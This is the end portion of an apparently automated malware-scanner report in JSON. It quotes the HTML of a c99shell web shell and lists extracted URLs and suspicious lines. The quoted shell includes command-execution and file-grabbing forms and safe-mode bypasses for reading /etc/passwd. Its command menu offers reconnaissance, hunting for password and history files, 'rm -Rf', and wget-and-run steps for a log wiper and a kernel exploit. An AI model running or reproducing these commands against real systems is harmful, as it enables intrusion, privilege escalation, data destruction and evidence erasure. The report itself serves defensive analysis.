            "<nobr>[<a href=\"?act=f&f=setupmailserver&ft=info&base64=3&d=%2Fscripts%2F\">+chunk+quotes</a>]&nbsp;</nobr>",
            "<nobr>[<a href=\"?act=f&f=setupmailserver&ft=info&base64=4&d=%2Fscripts%2F\">Decode</a>]&nbsp;</nobr>",
            "</td></tr></table><a bookmark=\"minipanel\"><br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>",
            "<tr><td width=\"100%\" height=\"1\" valign=\"top\"><center><form action=\"?\"><input type=hidden name=act value=\"cmd\"><br/><b>CMD:</b> <input type=hidden name=\"d\" value=\"/scripts/\"><input type=\"text\" name=\"cmd\" size=\"50\" value=\"\"><input type=hidden name=\"cmd_txt\" value=\"1\">&nbsp;<input type=submit name=submit value=\"Execute\"></form></td></tr></TABLE>",
            "<br>",
            "<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>",
            "<tr>",
            " <td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: <a href=\"?act=search&d=%2Fscripts%2F\"><b>Search</b></a> ::</b><form method=\"POST\"><input type=hidden name=act value=\"search\"><input type=hidden name=\"d\" value=\"/scripts/\"><input type=\"text\" name=\"search_name\" size=\"29\" value=\"(.*)\">&nbsp;<input type=\"checkbox\" name=\"search_name_regexp\" value=\"1\"  checked> - regexp&nbsp;<input type=submit name=submit value=\"Search\"></form></center></p></td>",
            " <td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: <a href=\"?act=upload&d=%2Fscripts%2F\"><b>Upload</b></a> ::</b><form method=\"POST\" ENCTYPE=\"multipart/form-data\"><input type=hidden name=act value=\"upload\"><input type=\"file\" name=\"uploadfile\"><input type=hidden name=\"miniform\" value=\"1\">&nbsp;<input type=submit name=submit value=\"Upload\"><br><font color=red>[ Read-Only ]</font></form></center></td>",
            "</tr>",
            "</table>",
            "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Remote File Grabber ::</b><br/><br/><form action=\"?grab=true\"   method=\"post\">File Url:<input name=\"from\"> New File Name: <input name=\"to\"> <input type=\"submit\" value=\"Grab!\"></center></td></tr></table>",
            "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Make Dir ::<p><form action=\"?\"><input type=hidden name=act value=\"mkdir\"><input type=hidden name=\"d\" value=\"/scripts/\"><input type=\"text\" name=\"mkdir\" size=\"50\" value=\"/scripts/\">&nbsp;<input type=submit value=\"Create\"><br><font color=red>[ Read-Only ]</font></form></center></td><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Make File ::</b><form method=\"POST\"><input type=hidden name=act value=\"mkfile\"><input type=hidden name=\"d\" value=\"/scripts/\"><input type=\"text\" name=\"mkfile\" size=\"50\" value=\"/scripts/\"><input type=hidden name=\"ft\" value=\"edit\">&nbsp;<input type=submit value=\"Create\"><br><font color=red>[ Read-Only ]</font></form></center></td></tr></table>",
            "<br>",
            "<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"116\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>",
            "<tr>",
            "  <td width=\"50%\" height=\"83\" valign=\"top\"><center>",
            "    <div align=\"center\"><br/><b>:: Useful Commands ::</b>",
            "    </div>",
            "    <form action=\"?\">",
            "      <div align=\"center\">",
            "        <input type=hidden name=act value=\"cmd\">",
            "        <input type=hidden name=\"d\" value=\"/scripts/\">",
            " <SELECT NAME=\"cmd\">",
            "           <OPTION VALUE=\"tar -cvf NEWTAR!!.tar -c /home/chsclair/public_html/td-admin/modules/gallery_management/images",
            "\">Tar your current directory. (Only works if your dir. is writable)",
            "           <OPTION VALUE=\"pwd\">List your current directory",
            "           <OPTION VALUE=\"ls -lia\">List you current directory's files, folders, & permissions",
            "           <OPTION VALUE=\"find / -type f -perm -04000 -ls\">find suid files",
            "           <OPTION VALUE=\"find . -type f -perm -04000 -ls\">find suid files in current dir",
            "           <OPTION VALUE=\"find / -type f -perm -02000 -ls\">find sgid files",
            "           <OPTION VALUE=\"find . -type f -perm -02000 -ls\">find sgid files in current dir",
            "           <OPTION VALUE=\"uname -a\">Kernel version",
            "           <OPTION VALUE=\"w\">Logged in users",
            "           <OPTION VALUE=\"lastlog\">Last users to connect",
            "           <OPTION VALUE=\"find /bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin -perm -4000 2> /dev/null\">Suid bins",
            "           <OPTION VALUE=\"cut -d: -f1,2,3 /etc/passwd | grep ::\">Users without passwords",
            "                    <OPTION VALUE=\"find /etc/ -type f -perm -o+w 2> /dev/null\">Is /etc/ writable?",
            "                    <OPTION VALUE=\"which wget curl w3m lynx\">We got downloaders? :D",
            "                    <OPTION VALUE=\"cat /proc/version /proc/cpuinfo\">CpuInfo",
            "                    <OPTION VALUE=\"netstat -atup | grep IST\">Open ports",
            "                    <OPTION VALUE=\"locate gcc\">Is gcc installed?",
            "\t\t    <OPTION VALUE=\"find / -type f -name config.inc.php\">find config.inc.php files",
            "<OPTION VALUE=\"find . -type f -name config.inc.php\">find config.inc.php files in current dir",
            "<OPTION VALUE=\"find / -type f -name \"config*\">find config* files",
            "<OPTION VALUE=\"find . -type f -name \"config*\">find config* files in current dir",
            "<OPTION VALUE=\"find / -type f -perm -2 -ls\">find all writable files",
            "<OPTION VALUE=\"find . -type f -perm -2 -ls\">find all writable files in current dir",
            "<OPTION VALUE=\"find /  -type d -perm -2 -ls\">find all writable directories",
            "<OPTION VALUE=\"find . -type d -perm -2 -ls\">find all writable directories in current dir",
            "<OPTION VALUE=\"find / -perm -2 -ls\">find all writable directories and files",
            "<OPTION VALUE=\"find . -perm -2 -ls\">find all writable directories and files in current dir",
            "<OPTION VALUE=\"find / -type f -name service.pwd\">find all service.pwd files",
            "<OPTION VALUE=\"find . -type f -name service.pwd\">find service.pwd files in current dir'",
            "<OPTION VALUE=\"find / -type f -name .htpasswd\">find all .htpasswd files",
            "<OPTION VALUE=\"find . -type f -name .htpasswd\">find .htpasswd files in current dir",
            "<OPTION VALUE=\"find / -type f -name .bash_history\">find all .bash_history files",
            "<OPTION VALUE=\"find . -type f -name .bash_history\">find .bash_history files in current dir",
            "<OPTION VALUE=\"find / -type f -name .mysql_history\">find all .mysql_history files",
            "<OPTION VALUE=\"find . -type f -name .mysql_history\">find .mysql_history files in current dir",
            "<OPTION VALUE=\"find / -type f -name .fetchmailrc\">find all .fetchmailrc files",
            "<OPTION VALUE=\"find . -type f -name .fetchmailrc\">find .fetchmailrc files in current dir",
            "<OPTION VALUE=\"lsattr -va\">list file attributes on a Linux second extended file system",
            "                    <OPTION VALUE=\"rm -Rf\">Format this box.",
            "                    <OPTION VALUE=\"wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c\">WIPELOGS PT1 (If wget installed)",
            "                    <OPTION VALUE=\"gcc zap2.c -o zap2\">WIPELOGS PT2",
            "                    <OPTION VALUE=\"./zap2\">WIPELOGS PT3",
            "                    <OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/debug/k3\">Kernel attack (Krad.c) PT1 (If wget installed)",
            "                    <OPTION VALUE=\"./k3 1\">Kernel attack (Krad.c) PT2 (L1)",
            "                    <OPTION VALUE=\"./k3 2\">Kernel attack (Krad.c) PT2 (L2)",
            "                    <OPTION VALUE=\"./k3 3\">Kernel attack (Krad.c) PT2 (L3)",
            "                    <OPTION VALUE=\"./k3 4\">Kernel attack (Krad.c) PT2 (L4)",
            "                    <OPTION VALUE=\"./k3 5\">Kernel attack (Krad.c) PT2 (L5)",
            "                  </SELECT>",
            "        <input type=hidden name=\"cmd_txt\" value=\"1\">",
            "        &nbsp;",
            "        <input type=submit name=submit value=\"Execute\"></div>",
            "    </form>",
            "    </td>",
            "  <td width=\"50%\" height=\"83\" valign=\"top\"><center>",
            "  <center><br/><b>:: Kernel Info :: </b>",
            "<form action=http://google.com/search name=f><input type=hidden name=client value=\"firefox-a\"><input type=hidden name=rls value=\"org.mozilla:en-US:official_s\"><input type=hidden name=hl value=en><input id=sf maxLength=256 name=q value=\"Linux wc3.titleworkspace.com 2.6.18-194.32.1.el5 #1 SMP Wed Jan 5 17:53:09",
            "EST 2011 i686\" size=30>&nbsp;<input type=submit value=\"Search\" name=btnG></form>",
            "</center>",
            "    </td>",
            "</tr></TABLE><br>",
            "<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"116\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>",
            "<tr>",
            "  <td width=\"50%\" height=\"83\" valign=\"top\"><center>",
            "    <div align=\"center\">Php Safe-Mode Bypass (Read Files)",
            "    </div><br>",
            "    <form action=\"?\">",
            "      <div align=\"center\">",
            "      File: <input type=\"text\" name=\"file\" method=\"get\"> <input type=\"submit\" value=\"Read File\"><br><br> eg: /etc/passwd<br>",
            "      ",
            "      ",
            "      ",
            "           ",
            "      ",
            "      ",
            "      \t",
            "          <br>",
            "      </div>",
            "    </form>",
            "    </td>",
            "  <td width=\"50%\" height=\"83\" valign=\"top\"><center>",
            "   <center>Php Safe-Mode Bypass (List Directories):     <form action=\"?\">",
            "      <div align=\"center\"><br>",
            "      Dir: <input type=\"text\" name=\"directory\" method=\"get\"> <input type=\"submit\" value=\"List Directory\"><br><br> eg: /etc/<br>",
            "    </form></center>",
            "    </td>",
            "</tr></TABLE>",
            "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Go Dir ::</b><form action=\"?\"><input type=hidden name=act value=\"ls\"><input type=\"text\" name=\"d\" size=\"50\" value=\"/scripts/\">&nbsp;<input type=submit value=\"Go\"></form></center></td><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Go File ::</b><form action=\"?\"><input type=hidden name=act value=\"gofile\"><input type=hidden name=\"d\" value=\"/scripts/\"><input type=\"text\" name=\"f\" size=\"50\" value=\"/scripts/\">&nbsp;<input type=submit value=\"Go\"></form></center></td></tr></table>",
            "</td>",
            "</tr>",
            "</TABLE>",
            "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"990\" height=\"1\" valign=\"top\"><p align=\"center\"><b>--[ c99shell modded by synsta. | Page generation time: 0.0587 ]--</p></td></tr></table>",
            "<br/></body></html>"
        ],
        "file": {},
        "fuzzing": {
            "Possible connections": [
                "                    <OPTION VALUE=\"which wget curl w3m lynx\">We got downloaders? :D",
                "                    <OPTION VALUE=\"wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c\">WIPELOGS PT1 (If wget installed)",
                "                    <OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/debug/k3\">Kernel attack (Krad.c) PT1 (If wget installed)"
            ]
        },
        "ip": [],
        "url": [
            "http://google.com/search",
            "http://ftp.powernet.com.tr/supermail/debug/k3",
            "http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c"
        ]
    },
    "time": "0:00:00.718353",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
